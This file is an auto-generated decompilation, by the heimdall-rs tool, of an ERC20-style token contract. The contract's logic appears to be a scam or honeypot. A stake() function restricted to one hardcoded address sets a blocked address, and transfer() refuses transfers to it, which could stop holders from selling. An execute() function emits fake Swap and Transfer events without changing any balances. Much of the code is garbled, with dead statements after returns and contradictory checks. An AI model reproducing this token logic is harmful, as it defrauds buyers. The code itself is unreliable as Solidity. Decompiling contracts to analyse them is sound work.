// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    uint256 public constant decimals = 8;
    
    bytes32 store_f;
    bytes32 store_a;
    address store_c;
    mapping(bytes32 => bytes32) storage_map_b;
    uint256 public totalSupply;
    address public owner;
    
    event Approval(address, address, uint256);
    event Swap(address, uint256, uint256, uint256, uint256, address);
    event Transfer(address, address, uint256);
    event OwnershipTransferred(address, address);
    
    /// @custom:selector    0x06fdde03
    /// @custom:signature   name() public view returns (string memory)
    function name() public view returns (string memory) {
        if (store_a) {
            if (store_a - ((store_a / 0x02) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));
                uint256 var_d = store_a / 0x02;
                if (store_a) {
                    if (store_a - ((store_a / 0x02) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_a / 0x02) {
                            if (0x1f < (store_a / 0x02)) {
                                var_a = 0x04;
                                var_e = storage_map_b[var_a];
                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {
                                    uint256 var_e = (var_c + 0x20) - var_c;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xa9059cbb
    /// @custom:signature   transfer(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function transfer(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(address(msg.sender) - 0, "ERC20: transfer amount exceeds balance");
        require(address(arg0) - 0, "ERC20: transfer amount exceeds balance");
        require(address(store_c / 0x01) == 0, "ERC20: transfer amount exceeds balance");
        require(!(address(arg0) == (address(store_c / 0x01))), "ERC20: transfer amount exceeds balance");
        require(!(address(arg0) == (address(store_c / 0x01))), "ERC20: transfer amount exceeds balance");
        address var_a = address(msg.sender);
        var_b = 0x01;
        require(!(storage_map_b[var_a] < arg1), "ERC20: transfer amount exceeds balance");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x26;
        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;
        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;
        var_a = address(msg.sender);
        var_b = 0x01;
        storage_map_b[var_a] = storage_map_b[var_a] - arg1;
        var_a = address(arg0);
        var_b = 0x01;
        storage_map_b[var_a] = storage_map_b[var_a] + arg1;
        uint256 var_c = arg1;
        emit Transfer(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        require(0);
        require(arg1 < 0x64);
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x23;
        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;
        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x25;
        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;
        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x23b872dd
    /// @custom:signature   Unresolved_23b872dd(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_23b872dd(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x26476204
    /// @custom:signature   stake(address arg0) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function stake(address arg0) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        require(address(msg.sender) - 0x986acb09f92f1bd911755aabc3da19e97e54f229);
        store_c = (address(arg0) * 0x01) | (uint96(store_c));
        var_a = 0x01;
        return 0x01;
        var_a = 0x01;
        return 0x01;
    }
    
    /// @custom:selector    0x70a08231
    /// @custom:signature   balanceOf(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function balanceOf(address arg0) public view returns (uint256) {
        require(arg0 == (address(arg0)));
        address var_a = address(arg0);
        var_b = 0x01;
        address var_c = storage_map_b[var_a];
        return storage_map_b[var_a];
    }
    
    /// @custom:selector    0x95d89b41
    /// @custom:signature   symbol() public view returns (string memory)
    function symbol() public view returns (string memory) {
        if (store_f) {
            if (store_f - ((store_f / 0x02) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_f / 0x02)) / 0x20) * 0x20));
                uint256 var_d = store_f / 0x02;
                if (store_f) {
                    if (store_f - ((store_f / 0x02) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_f / 0x02) {
                            if (0x1f < (store_f / 0x02)) {
                                var_a = 0x05;
                                var_e = storage_map_b[var_a];
                                if ((0x20 + var_c) + (store_f / 0x02) > (0x20 + (0x20 + var_c))) {
                                    uint256 var_e = (var_c + 0x20) - var_c;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xdd62ed3e
    /// @custom:signature   Unresolved_dd62ed3e(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_dd62ed3e(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x715018a6
    /// @custom:signature   renounceOwnership() public payable
    function renounceOwnership() public payable {
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        owner = 0 | (uint96(owner));
        emit OwnershipTransferred(address(owner / 0x01), 0);
    }
    
    /// @custom:selector    0xbeabacc8
    /// @custom:signature   Unresolved_beabacc8(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_beabacc8(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x095ea7b3
    /// @custom:signature   approve(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approve(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(address(msg.sender) - 0, "ERC20: approve to the zero address");
        require(address(arg0) - 0, "ERC20: approve to the zero address");
        address var_a = address(msg.sender);
        var_b = 0x02;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        storage_map_b[var_a] = arg1;
        uint256 var_c = arg1;
        emit Approval(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x22;
        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);
        var_f = 0x24;
        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xaafe62d1
    /// @custom:signature   execute(address[] arg0, uint256 arg1, address arg2) public view
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    /// @param              arg2 ["address", "uint160", "bytes20", "int160"]
    function execute(address[] arg0, uint256 arg1, address arg2) public view {
        require(!arg0 > 0xffffffffffffffff);
        require(!(arg0) > 0xffffffffffffffff);
        require(arg1 == arg1);
        require(arg2 == (address(arg2)));
        require(!0 < (arg0));
        require(0 < (arg0));
        require(!(((0 + ((0x04 + arg0) + 0x20)) + 0x20) - (0 + ((0x04 + arg0) + 0x20))) < 0x20);
        require(((0 + (arg0 + 0x20)) + 0) == (address((0 + (arg0 + 0x20)) + 0)));
        uint256 var_a = arg1;
        uint256 var_b = 0;
        uint256 var_c = 0;
        uint256 var_d = arg1;
        emit Swap(address(arg2), address((0 + (arg0 + 0x20)) + 0), arg1, 0, 0, arg1);
        require(0 < (arg0));
        require(!(((0 + ((0x04 + arg0) + 0x20)) + 0x20) - (0 + ((0x04 + arg0) + 0x20))) < 0x20);
        require(((0 + (arg0 + 0x20)) + 0) == (address((0 + (arg0 + 0x20)) + 0)));
        var_a = arg1;
        emit Transfer(address(store_c / 0x01), address((0 + (arg0 + 0x20)) + 0), arg1);
        require(0x01);
        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_f = 0x11;
        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_f = 0x32;
        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_f = 0x32;
    }
    
    /// @custom:selector    0xf2fde38b
    /// @custom:signature   transferOwnership(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function transferOwnership(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(address(owner / 0x01) == (address(msg.sender)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x20;
        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        require(address(arg0) - 0, "Ownable: new owner is the zero address");
        owner = (address(arg0) * 0x01) | (uint96(owner));
        emit OwnershipTransferred(address(owner / 0x01), address(arg0));
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);
        var_d = 0x26;
        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;
        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;
    }
}